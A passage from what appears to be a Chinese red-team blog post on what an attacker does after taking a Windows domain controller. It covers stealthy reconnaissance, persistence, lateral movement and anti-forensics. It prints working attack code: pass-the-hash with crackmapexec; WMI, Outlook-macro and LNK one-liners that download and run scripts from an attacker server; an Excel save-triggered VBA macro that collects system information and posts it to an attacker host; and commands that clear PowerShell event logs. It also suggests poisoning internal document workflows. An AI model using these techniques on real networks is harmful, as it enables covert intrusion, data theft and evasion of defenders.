+</li>
+<li><p>等用户登录后，在他会话里触发你的 payload这种方法就比较需要用户本身的交互，隐蔽性的保证我会在后续的方案中提到</p>
+</li>
+</ol>
+<p><strong>从浏览器数据中提取情报：</strong></p>
+<p><strong>密码管理分析：</strong></p>
+<ul>
+<li><p>保存的登录凭据（内网系统、云服务、VPN等）</p>
+</li>
+<li><p>自动填充的表单数据（可能包含敏感信息）</p>
+</li>
+<li><p>支付信息和个人资料</p>
+</li>
+</ul>
+<p><strong>业务系统映射：</strong></p>
+<ul>
+<li><p>访问历史中的内网域名和IP</p>
+</li>
+<li><p>书签中的业务系统分类</p>
+</li>
+<li><p>下载记录中的敏感文件</p>
+</li>
+</ul>
+<p><strong>社交工程素材：</strong></p>
+<ul>
+<li><p>搜索历史揭示的兴趣爱好</p>
+</li>
+<li><p>社交媒体账号和活动轨迹</p>
+</li>
+<li><p>个人习惯和行为模式</p>
+</li>
+</ul>
+<h4 id="用户行为分析"><a href="#用户行为分析" class="headerlink" title="用户行为分析"></a>用户行为分析</h4><p> <strong>文件系统考古：</strong></p>
+<p>不同于暴力搜索，这里要做的是”考古式”的挖掘：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 用户最近活动的文件</span><br><span class="line">Get-ChildItem -Path C:\Users\*\Desktop -Recurse -Include *.lnk | </span><br><span class="line">ForEach-Object &#123; </span><br><span class="line">    $shell = New-Object -ComObject WScript.Shell</span><br><span class="line">    $shortcut = $shell.CreateShortcut($_.FullName)</span><br><span class="line">    [PSCustomObject]@&#123;</span><br><span class="line">        Name = $_.Name</span><br><span class="line">        TargetPath = $shortcut.TargetPath</span><br><span class="line">        WorkingDirectory = $shortcut.WorkingDirectory</span><br><span class="line">        LastWriteTime = $_.LastWriteTime</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Office文档的元数据分析</span><br><span class="line">Get-ChildItem -Path C:\Users\*\Documents -Include *.docx,*.xlsx,*.pptx -Recurse |</span><br><span class="line">ForEach-Object &#123;</span><br><span class="line">    $doc = New-Object -ComObject Word.Application</span><br><span class="line">    $document = $doc.Documents.Open($_.FullName, $false, $true)</span><br><span class="line">    [PSCustomObject]@&#123;</span><br><span class="line">        FileName = $_.Name</span><br><span class="line">        Author = $document.BuiltInDocumentProperties.Item(&quot;Author&quot;).Value</span><br><span class="line">        Company = $document.BuiltInDocumentProperties.Item(&quot;Company&quot;).Value</span><br><span class="line">        LastModifiedBy = $document.BuiltInDocumentProperties.Item(&quot;Last Author&quot;).Value</span><br><span class="line">        CreationDate = $document.BuiltInDocumentProperties.Item(&quot;Creation Date&quot;).Value</span><br><span class="line">    &#125;</span><br><span class="line">    $document.Close()</span><br><span class="line">    $doc.Quit()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>网络连接历史分析：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># DNS缓存分析</span><br><span class="line">ipconfig /displaydns | Select-String &quot;Record Name&quot; | </span><br><span class="line">ForEach-Object &#123; $_.ToString().Split(&quot;:&quot;)[1].Trim() &#125; |</span><br><span class="line">Sort-Object | Get-Unique</span><br><span class="line"></span><br><span class="line"># 持久化连接分析</span><br><span class="line">netstat -an | Select-String &quot;ESTABLISHED&quot;</span><br><span class="line"></span><br><span class="line"># WiFi连接历史</span><br><span class="line">netsh wlan show profiles | Select-String &quot;All User Profile&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>应用程序使用模式：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 最近运行的程序</span><br><span class="line">Get-ItemProperty &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU&quot; |</span><br><span class="line">Select-Object -Property * -ExcludeProperty PS*</span><br><span class="line"></span><br><span class="line"># 跳转列表分析（显示用户最常用的文件和应用）</span><br><span class="line">Get-ChildItem &quot;$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations&quot; -Filter &quot;*.automaticDestinations-ms&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="五、隐蔽持久化"><a href="#五、隐蔽持久化" class="headerlink" title="五、隐蔽持久化"></a>五、隐蔽持久化</h2><h3 id="持久化与横向移动也应贴近业务流，不制造异常流量"><a href="#持久化与横向移动也应贴近业务流，不制造异常流量" class="headerlink" title="持久化与横向移动也应贴近业务流，不制造异常流量"></a>持久化与横向移动也应贴近业务流，不制造异常流量</h3><p>要避免”显眼”特征，就不能搞那些显式的smb&#x2F;brute&#x2F;全流量扫描。</p>
+<h4 id="常规思路-文件不落地的简单隐蔽打法"><a href="#常规思路-文件不落地的简单隐蔽打法" class="headerlink" title="常规思路&amp;文件不落地的简单隐蔽打法"></a>常规思路&amp;文件不落地的简单隐蔽打法</h4><p><strong>1. 利用AD中继 PTH全域</strong> NTLM中继攻击捕获目标的Net-NTLM Hash，并使用Hash传递（Pass-the-Hash, PtH）技术直接认证到其他主机，无需在目标主机上写入文件，实现横向移动。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 直接上cme，这个比较常规，就是cme组合拳上线</span><br><span class="line">crackmapexec smb &lt;Target_IP&gt; -u &lt;Username&gt; -H &lt;NTLM_Hash&gt; -x &quot;&lt;command&gt;&quot;</span><br><span class="line"></span><br><span class="line"># 不过就目前而言 nxc的效果会比cme好些</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c6650469/debef6d3-0c55-33fd-a9f1-1aecd6b2ed10.png" alt="image.png"></p>
+<p><strong>2. 利用WMI执行远程命令（无二进制落地）</strong> Windows Management Instrumentation (WMI) 是Windows系统管理接口，可通过DCOM或WinRM协议远程执行命令，无需在目标主机上写入二进制文件，避免触发传统防病毒检测。</p>
+<p><strong>内存执行：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod -ComputerName  -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -ep bypass -c Invoke-RestMethod -Uri http:///malicious.ps1 | Invoke-Expression&quot;</span><br></pre></td></tr></table></figure>
+
+<p>规避检测可以使用加密通道（如WinRM over HTTPS）或混淆脚本以降低被检测概率。</p>
+<p> <strong>3. 利用RDP共享剪贴板进行数据搬运（非网络传输）</strong></p>
+<p><strong>流程：</strong></p>
+<ul>
+<li><p>建立RDP会话：攻击者需具备目标主机的RDP访问权限（通过凭据或漏洞利用）</p>
+</li>
+<li><p>启用剪贴板共享：确保RDP客户端（如mstsc.exe）配置允许剪贴板共享（默认启用）</p>
+</li>
+</ul>
+<p>数据提取：</p>
+<ul>
+<li><strong>在目标主机上，运行命令收集敏感数据</strong>，将结果复制到剪贴板</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content C:\sensitive.txt | Set-Clipboard</span><br></pre></td></tr></table></figure>
+
+<p>数据回传：</p>
+<ul>
+<li><strong>反向操作，将恶意脚本或命令通过剪贴板复制到目标主机</strong>，执行：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Clipboard | Invoke-Expression</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>4. 借助Outlook宏或LNK文件实现”无感知”植入</strong></p>
+<p><strong>Outlook宏：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Shell &quot;powershell.exe -ep bypass -c Invoke-RestMethod -Uri http://&lt;attacker_server&gt;/shell.ps1 | Invoke-Expression&quot;, vbHide</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<p><strong>LNK文件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$Shell = New-Object -ComObject WScript.Shell</span><br><span class="line">$Shortcut = $Shell.CreateShortcut(&quot;office365.lnk&quot;)</span><br><span class="line">$Shortcut.TargetPath = &quot;powershell.exe&quot;</span><br><span class="line">$Shortcut.Arguments = &quot;-ep bypass -c Invoke-RestMethod -Uri http://&lt;attacker_server&gt;/office365.ps1 | Invoke-Expression&quot;</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c6650469/edaf88ac-2121-3669-bdfa-9b28aff00a9c.png" alt="image.png"></p>
+<p><a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-cn/office/%E5%9C%A8-outlook-%E4%B8%AD%E5%88%9B%E5%BB%BA%E5%AE%8F-ffc49e8c-0e5b-4daa-912d-e68c6c46bf27">在 Outlook 中创建宏 - Microsoft 支持</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9787">常见钓鱼招式-先知社区</a></p>
+<p><strong>但本质还是需要交互，这是很不稳定的做法，更适合作为前期打点的入口。</strong></p>
+<h4 id="真正的隐蔽方案"><a href="#真正的隐蔽方案" class="headerlink" title="真正的隐蔽方案"></a>真正的隐蔽方案</h4><p>综上四种方法，都是比较常规的。我认为这种隐蔽不叫隐蔽，只是不上线C2罢了，这和反弹一个非交互式shell有什么区别呢？它只是更慢热而已，而非所谓的贴近业务做隐蔽。它们根本没有脱离入侵者行为模型，只是少了一些被查杀的风险而已，本质还是可预测的攻击行为。</p>
+<p> <strong>方案一：借用”内部运维平台”的业务流程做跳板</strong></p>
+<p><strong>示例流程：</strong></p>
+<ol>
+<li><p>发现某内部自动化平台（如Ansible、Jumpserver、SaltStack、K8S API</p>
+</li>
+<li><p>在运维系统的配置中植入小段命令（或回调URL）</p>
+</li>
+<li><p>可用于横向部署或信息收集，且路径可继承现有的执行上下文</p>
+<p><img src="/posts/c6650469/29ab9a44-7bcb-39b2-a292-9609cf4ba6a2.png" alt="image.png"></p>
+</li>
+</ol>
+<p><strong>优势：</strong> 既没有新的连接，同时这个命令的签名也是合法应用提供的，会被自动归因为系统用户行为。</p>
+<p> <strong>方案二：构造”数据流伪装”的隐蔽横向通信</strong></p>
+<p><strong>示例机制：</strong> 在企业内工作人员的日常业务文档（如<strong>Excel报价单</strong>）中嵌入VBA宏，触发”保存时”事件，收集目标系统信息并通过伪装的常规流量回传，规避网络监控。<strong>用户保存文档时自动触发，无需额外交互。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)</span><br><span class="line">    Dim cmd As String</span><br><span class="line">    Dim result As String</span><br><span class="line">    &#x27; 收集系统信息</span><br><span class="line">    cmd = &quot;cmd.exe /c whoami &amp; ipconfig &amp; tasklist&quot;</span><br><span class="line">    result = CreateObject(&quot;WScript.Shell&quot;).Exec(cmd).StdOut.ReadAll</span><br><span class="line">    </span><br><span class="line">    &#x27; 方法1：通过msxml2.xmlhttp发送HTTP</span><br><span class="line">    Dim http As Object</span><br><span class="line">    Set http = CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">    http.Open &quot;POST&quot;, &quot;http://&lt;attacker_server&gt;/upload&quot;, False</span><br><span class="line">    http.setRequestHeader &quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">    http.Send &quot;data=&quot; &amp; EncodeBase64(result) &#x27; Base64编码数据</span><br><span class="line">    </span><br><span class="line">    &#x27; 方法2：通过WebDAV或SMB保存到共享</span><br><span class="line">    Dim fs As Object</span><br><span class="line">    Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">    fs.CreateTextFile &quot;\\&lt;SMB_Server&gt;\share\env.txt&quot;, True</span><br><span class="line">    fs.Write result</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">&#x27; Base64编码函数</span><br><span class="line">Private Function EncodeBase64(text As String) As String</span><br><span class="line">    Dim xml As Object</span><br><span class="line">    Set xml = CreateObject(&quot;MSXML2.DOMDocument&quot;)</span><br><span class="line">    Dim node As Object</span><br><span class="line">    Set node = xml.createElement(&quot;base64&quot;)</span><br><span class="line">    node.dataType = &quot;bin.base64&quot;</span><br><span class="line">    node.Text = text</span><br><span class="line">    EncodeBase64 = node.nodeTypedValue</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>
+
+<p> 不过<strong>如果只是想拿来钓鱼放到用户的桌面</strong>，就太粗暴了，这种情况下一般<strong>需要在组织内部OA系统进行投毒，修改某些工单的附件以此污染内部的主机</strong></p>
+<p><strong>方案三：利用打印服务&#x2F;扫描仪&#x2F;ERP插件做隐蔽数据收集与横向</strong></p>
+<p>**打印&#x2F;扫描服务（如Spooler服务）**通常以SYSTEM权限运行，<strong>网络连接广泛</strong>（如共享打印机）。ERP插件（如SAP、Oracle E-Business Suite插件）常集成于业务流程，可访问敏感数据。</p>
+<p>一般情况下，可以<strong>通过探活内网snmp协议展开对打印设备的入侵</strong>，很多打印机 <strong>SNMP 社区口令默认为</strong> <code>private</code> <strong>可写</strong>，你可以做这些事：</p>
+<ul>
+<li>利用打印日志推用户名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v2c -c public &lt;IP&gt; .1.3.6.1.2.1.43.18.1.1.8</span><br><span class="line">→ 打印任务发起人：zhanglin.hr, lixiang.fin, huangwei.ceo</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反向推测业务分布</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PRT-FIN-02, PRT-HR-03, PRINT-F3-CEO</span><br></pre></td></tr></table></figure>
+
+<p>你可以据此判断：</p>
+<ul>
+<li><p>哪些业务线在哪些楼层</p>
+</li>
+<li><p>哪些区域有高权限使用者（CEO打印机）</p>
+</li>
+<li><p>某些高端设备会维护内建DNS缓存（HP、Ricoh设备），可以通过厂商MIB拉取缓存记录，从而就可以辅助识别网段边界、跳板位置、内部DNS信息</p>
+</li>
+</ul>
+<p><em>（由于在这方面研究比较少，所以就不展开叙述了）</em></p>
+<p><a target="_blank" rel="noopener" href="http://hacking-printers.net/">打印服务渗透wiki</a></p>
+<p><img src="/posts/c6650469/015aec4c-5bba-3acf-839b-dd6fbd3f0440.png" alt="image.png"></p>
+<p><strong>方案四：利用网络设备（路由器&#x2F;无线AP）构建隐蔽持久化跳板</strong></p>
+<p>内网中除了传统主机和服务器，<strong>企业路由器、三层交换机、无线AP等网络设备</strong>往往被安全防护系统“放过”。</p>
+<p><strong>类比解释</strong></p>
+<p>你是攻击者，主机是保安天天查身份证，EDR 就是摄像头在识别谁在动手。你现在如果：</p>
+<ul>
+<li><p>拿了个锁匠工具（Fscan、Powershell、Mimikatz）上来开门，系统会报警</p>
+</li>
+<li><p>用个奇怪的指令连接别人机器（WinRM&#x2F;WMI&#x2F;SMB），EDR 马上拉红</p>
+</li>
+<li><p>一上线 Beacon，立马就触发主机行为分析</p>
+</li>
+</ul>
+<p>这时候你再看路由器：</p>
+<ul>
+<li><p>它每天都在发包、收包、转发、NAT，这是它的“本职工作”</p>
+</li>
+<li><p>它经常和上百个终端建立连接，不是异常，而是常态</p>
+</li>
+<li><p>它本来就开放了 SSH、Telnet、Web 管理后台，没有人会觉得“一个路由器在监听端口很奇怪”</p>
+<p><strong>具体攻击手段也和前面的打印设备类似，区别的是它的终端远比打印设备的要完整，打印设备的PTCshell等协议在市面上已经很少有开源工具作为支持，而只要你进了路由器的后台，无论是tcpdump用户流量的trick，还是构造 NAT 映射：让它转发端口给你主控机都是隐蔽 安全的操作</strong></p>
+</li>
+</ul>
+<p>你不在线，你的跳板在线；你不扫网，你的跳板在旁路做转发——<strong>这才叫真正的隐身操控</strong>。</p>
+<h3 id="隐蔽性提升策略"><a href="#隐蔽性提升策略" class="headerlink" title="隐蔽性提升策略"></a>隐蔽性提升策略</h3><p><strong>流量打散</strong>：避免使用固定C2通道、使用多协议（HTTP、DNS、SMB over namedpipe） <strong>存储隐匿</strong>：恶意DLL注入到合法服务进程中，如svchost、spoolsv <strong>行为嵌套</strong>：伪装成定时任务或用户操作逻辑（如Outlook加载项） <strong>数据 exfil</strong>：打印队列、计划任务、截图偷发到内网SMTP或文件服务器</p>
+<h2 id="六、攻击路径规划：情报融合与攻击路径规划"><a href="#六、攻击路径规划：情报融合与攻击路径规划" class="headerlink" title="六、攻击路径规划：情报融合与攻击路径规划"></a>六、攻击路径规划：情报融合与攻击路径规划</h2><h3 id="用户价值评估矩阵"><a href="#用户价值评估矩阵" class="headerlink" title="用户价值评估矩阵"></a>用户价值评估矩阵</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>评估标准</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>组织地位</td>
+<td>AD中的组织层级、管理关系</td>
+</tr>
+<tr>
+<td>系统权限</td>
+<td>对关键系统的访问权限</td>
+</tr>
+<tr>
+<td>业务接触面</td>
+<td>接触敏感业务的程度</td>
+</tr>
+<tr>
+<td>技术敏感度</td>
+<td>对安全工具的熟悉程度</td>
+</tr>
+<tr>
+<td>社交价值</td>
+<td>在组织中的影响力</td>
+</tr>
+</tbody></table>
+<h3 id="基于情报的精准投递"><a href="#基于情报的精准投递" class="headerlink" title="基于情报的精准投递"></a>基于情报的精准投递</h3><p>不再是广撒网式的横向移动，而是基于用户画像的精准投递：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 示例：针对财务部门的定向攻击</span><br><span class="line"># 1. 识别财务相关用户</span><br><span class="line">$FinanceUsers = Get-ADUser -Filter * -Properties Department | </span><br><span class="line">Where-Object &#123; $_.Department -like &quot;*财务*&quot; -or $_.Department -like &quot;*Finance*&quot; &#125;</span><br><span class="line"></span><br><span class="line"># 2. 分析其常用系统和工作模式</span><br><span class="line"># 3. 设计贴合其工作流程的载荷投递方式</span><br></pre></td></tr></table></figure>
+
+<h3 id="持久化策略的业务化伪装"><a href="#持久化策略的业务化伪装" class="headerlink" title="持久化策略的业务化伪装"></a>持久化策略的业务化伪装</h3><p>基于收集到的用户行为数据，设计更加隐蔽的持久化方案：</p>
+<p><strong>场景一：利用用户的Office使用习惯：也就是前面提到的OA投毒</strong> </p>
+<p><strong>场景二：利用用户的软件使用模式</strong> 如果发现用户经常使用某个特定软件，可以通过DLL劫持或插件机制实现持久化，这样的行为更难被察觉。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/es/439859.html">这里推荐Loki C2的思路</a></strong></p>
+<p>Loki的攻击向量完全绕过了针对渲染器进程的全部安全加固措施。它通过劫持应用的启动脚本，直接在<strong>主进程</strong>的上下文中执行代码。由于主进程拥有与生俱来的、不受限制的Node.js权限，渲染器进程的沙盒化对此攻击毫无意义。</p>
+<p>它通过修改应用启动脚本来完成攻击。其最精妙的设计在于init.js后门启动器，这是一个精心设计的状态机，用于管理寄生虫与宿主的生命周期。</p>
+<h3 id="反溯源与痕迹清理"><a href="#反溯源与痕迹清理" class="headerlink" title="反溯源与痕迹清理"></a>反溯源与痕迹清理</h3><p>在深度信息收集的同时，也要考虑反溯源 </p>
+<p><strong>行为模式伪装：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 模拟正常用户的文件访问模式</span><br><span class="line"># 在收集信息的同时，也要访问一些正常的业务文件</span><br><span class="line">Get-ChildItem &quot;C:\Users\$env:USERNAME\Documents&quot; -Recurse |</span><br><span class="line">Get-Random -Count 5 | ForEach-Object &#123; Get-Content $_.FullName -Head 1 &#125;</span><br><span class="line"></span><br><span class="line"># 模拟正常的网络访问</span><br><span class="line">Invoke-WebRequest -Uri &quot;https://company-portal.com&quot; -UseBasicParsing</span><br></pre></td></tr></table></figure>
+
+<p><strong>日志污染与清理：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 选择性清理相关日志</span><br><span class="line">wevtutil cl &quot;Windows PowerShell&quot;</span><br><span class="line">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;</span><br><span class="line"></span><br><span class="line"># 或者注入正常的日志条目来掩盖异常行为</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以从上面的三个方案看出来，真正隐蔽的横向和持久化不应建立在”技术规避”上，<strong>而应建立在”业务拟态”与”角色继承”上</strong>。都是把自己当成业务中的一环，思考他们平时接触的服务以及工作的逻辑，做成<strong>类似水坑攻击的打法</strong>。</p>
+<h3 id="整体策略小结"><a href="#整体策略小结" class="headerlink" title="整体策略小结"></a>整体策略小结</h3><table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>收集目标</th>
+<th>目的</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>高</td>
+<td>用户、组、描述字段</td>
+<td>识别高价值目标</td>
+</tr>
+<tr>
+<td>高</td>
+<td>组策略 + 共享配置</td>
+<td>查找潜在控制路径</td>
+</tr>
+<tr>
+<td>中</td>
+<td>凭据路径、RDP记录</td>
+<td>判断行为 + 凭据可用性</td>
+</tr>
+<tr>
+<td>中</td>
+<td>主机命名规律 + 访问痕迹</td>
+<td>判断资产属性</td>
+</tr>
+<tr>
+<td>低</td>
+<td>SMB共享文档、日志内容</td>
+<td>侧写业务内容</td>
+</tr>
+</tbody></table>
+<p><img src="/posts/c6650469/e4bd5233-534b-3fde-aadc-64c87ad011a0.png" alt="image.png"></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>高阶红队渗透的核心在于**从技术导向转向业务导向，从工具依赖转向思维推演，从暴力扫描转向精准定位。真正的隐蔽不是技术层面的规避，**而是业务层面的拟态。</p>
+<p>拿到域控之后，我们<strong>要做的不是继续”攻击”，而是要成为这个网络环境中的”业务大水坑”</strong>。通过深度的用户行为分析和情报融合，我们可以构建出比任何自动化工具都要精准的攻击路径。</p>
+<p>记住：<strong>在高阶渗透中，信息比权限更重要，理解比占领更有价值。</strong></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://blog.sudo.online/posts/c6650469/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://blog.sudo.online/posts/c6650469/&title=仅仅拿下了域控？ - Satoru's Blog&summary=在高阶渗透中，信息比权限更重要，理解比占领更有价值"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=仅仅拿下了域控？ - Satoru's Blog&amp;body=https://blog.sudo.online/posts/c6650469/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://blog.sudo.online/posts/c6650469/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/2580e02a/">AV_EDR对抗痛点</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/877fc705/">身份隐藏_无痕系列(1)</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body beaudar'>
+      
+
+<svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="beaudar" repo="sat0ru-qwq/blog-comment" issue-term="pathname" theme="preferred-color-scheme" input-position="top" comment-order="desc" loading="true" branch="main"></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Satoru</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%85%E4%BB%85%E6%8B%BF%E4%B8%8B%E4%BA%86%E5%9F%9F%E6%8E%A7%EF%BC%9F"><span class="toc-text">仅仅拿下了域控？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90%EF%BC%9A%E7%BB%95%E5%BC%80FScan%E9%80%BB%E8%BE%91%E7%9A%84%E9%9A%90%E8%94%BD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">一、组织结构分析：绕开FScan逻辑的隐蔽信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 